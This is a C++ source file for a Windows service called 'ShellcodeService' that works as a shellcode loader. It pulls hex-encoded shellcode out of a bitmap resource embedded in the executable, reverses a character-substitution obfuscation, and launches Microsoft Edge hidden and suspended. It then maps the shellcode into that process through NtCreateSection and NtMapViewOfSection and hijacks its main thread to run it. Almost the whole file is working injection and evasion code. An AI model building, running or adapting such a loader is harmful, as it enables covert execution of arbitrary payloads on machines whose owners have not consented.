#include <Windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>
#include <tchar.h>
#include <winternl.h>
#include <winnt.h>
#include <string>

#include "Native.h"
#include "resource.h"

#pragma comment(lib, "winhttp.lib")

WCHAR SERVICE_NAME[] = L"ShellcodeService";
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

// service function
void ServiceMain(int argc, char* argv[]);

//Function to control the service
void ControlHandler(DWORD request);

// Logs
void LogEvent(const char* message, WORD type);

int main()
{
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        LogEvent("Failed to start service control dispatcher.", EVENTLOG_ERROR_TYPE);
    }

    return 0;
}


std::string resource()
{   // Find the ressource
    HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDB_BITMAP1), RT_BITMAP);
    if (!hRsrc) {
        std::cerr << "Error : Resource BMP notre find in executable." << std::endl;
        return "";
    }

    // Load the rc
    HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
    if (!hGlobal) {
        std::cerr << "Error : Impossible to load the ressource file." << std::endl;
        return "";
    }

    // Lock the rc and obtain the pointer
    PVOID ptr = LockResource(hGlobal);
    if (!ptr) {
        std::cerr << "Error : impossible to lock" << std::endl;
        return "";
    }

    // file size
    SIZE_T size = SizeofResource(NULL, hRsrc);
    if (size == 0) {
        std::cerr << "Error : size of ressource file null." << std::endl;
        return "";
    }

    // Convert
    std::string result(reinterpret_cast<const char*>(ptr), size);
    return result;
}

// Extract the data defined by th delimiter
std::string extractHexDataFromString(const std::string& data) {
    std::string delimiter_start = "\n--START_HEX_DATA--\n";
    std::string delimiter_end = "\n--END_HEX_DATA--\n";

    size_t start_pos = data.find(delimiter_start);
    size_t end_pos = data.find(delimiter_end);

    if (start_pos == std::string::npos || end_pos == std::string::npos) {
        std::cerr << "delimiter not find." << std::endl;
        return "";
    }

    // extract the HEX
    std::string hex_data = data.substr(start_pos + delimiter_start.length(), end_pos - (start_pos + delimiter_start.length()));

    return hex_data;
}


std::string restoreHexDigits(const std::string& replacedHex) {
    std::string restored;
    for (char c : replacedHex) {
        if (c >= 'g' && c <= 'l') {
            restored.push_back('0' + (c - 'g'));
        }
        else {
            restored.push_back(c);
        }
    }
    return restored;
}

// Hex to bin
std::vector<unsigned char> hexToBinary(const std::string& hex_string) {
    std::vector<unsigned char> binary_data;
    for (size_t i = 0; i < hex_string.length(); i += 2) {
        std::string byte_str = hex_string.substr(i, 2);
        unsigned char byte = (unsigned char)std::stoi(byte_str, nullptr, 16);
        binary_data.push_back(byte);
    }
    return binary_data;
}


void InjectShellcode() {
    std::string raw_data = resource();


    std::string hex_data = extractHexDataFromString(raw_data);

    std::string restored_hex = restoreHexDigits(hex_data);

    std::vector<unsigned char> shellcode = hexToBinary(restored_hex);

    // create startup info struct
    LPSTARTUPINFOW startup_info = new STARTUPINFOW();
    startup_info->cb = sizeof(STARTUPINFOW);
    startup_info->dwFlags = STARTF_USESHOWWINDOW;

    // create process info struct
    PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();

    // null terminated command line
    wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";

    // create process
    CreateProcess(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | CREATE_SUSPENDED,
        NULL,
        NULL,
        startup_info,
        process_info);

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    NtCreateSection ntCreateSection = (NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    NtMapViewOfSection ntMapViewOfSection = (NtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection ntUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");


    // create section in local process
    HANDLE hSection;
    LARGE_INTEGER szSection = { shellcode.size() };

    NTSTATUS status = ntCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        &szSection,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        NULL);

    // map section into memory of local process
    PVOID hLocalAddress = NULL;
    SIZE_T viewSize = 0;

    status = ntMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &hLocalAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // copy shellcode into local memory
    RtlCopyMemory(hLocalAddress, &shellcode[0], shellcode.size());

    // map section into memory of remote process
    PVOID hRemoteAddress = NULL;

    status = ntMapViewOfSection(
        hSection,
        process_info->hProcess,
        &hRemoteAddress,
        NULL,
        NULL,
        NULL,
        &viewSize,
        ViewShare,
        NULL,
        PAGE_EXECUTE_READWRITE);

    // get context of main thread
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(process_info->hThread, pContext);

    // update rcx context
    pContext->Rcx = (DWORD64)hRemoteAddress;
    SetThreadContext(process_info->hThread, pContext);

    // resume thread
    ResumeThread(process_info->hThread);

    // unmap memory from local process
    status = ntUnmapViewOfSection(
        GetCurrentProcess(),
        hLocalAddress);
    
}


void ServiceMain(int argc, char* argv[]) {
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;

    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, (LPHANDLER_FUNCTION)ControlHandler);
    if (hStatus == (SERVICE_STATUS_HANDLE)NULL) {
        LogEvent("Failed to register service control handler.", EVENTLOG_ERROR_TYPE);
        return;
    }

    // service running state
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    SetServiceStatus(hStatus, &ServiceStatus);

    LogEvent("Service is starting...", EVENTLOG_INFORMATION_TYPE);

    // state ERVICE_RUNNING
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);

    LogEvent("Service is now running.", EVENTLOG_INFORMATION_TYPE);

    try {

        // Inject the shellcode 
        InjectShellcode();

        LogEvent("Shellcode injected successfully.", EVENTLOG_INFORMATION_TYPE);
    }
    catch (...) {
        LogEvent("An error occurred during shellcode injection.", EVENTLOG_ERROR_TYPE);
    }

    // Maitain the service up
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        Sleep(1000);  
    }

    // Stopping the prgm
    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(hStatus, &ServiceStatus);
    LogEvent("Service has stopped.", EVENTLOG_INFORMATION_TYPE);

    // Maintenir le service actif
    //while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
     //   Sleep(1000);
    //}
}

void ControlHandler(DWORD request) {
    switch (request) {
    case SERVICE_CONTROL_STOP:
        LogEvent("Service stop requested.", EVENTLOG_INFORMATION_TYPE);
        ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        SetServiceStatus(hStatus, &ServiceStatus);

        // Stop prgm
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        break;
    default:
        break;
    }
}


void LogEvent(const char* message, WORD type) {
    HANDLE hEventSource = RegisterEventSource(NULL, SERVICE_NAME);
    if (hEventSource) {
        ReportEvent(hEventSource, type, 0, 0, NULL, 1, 0, 0, NULL);
        DeregisterEventSource(hEventSource);
    }
}

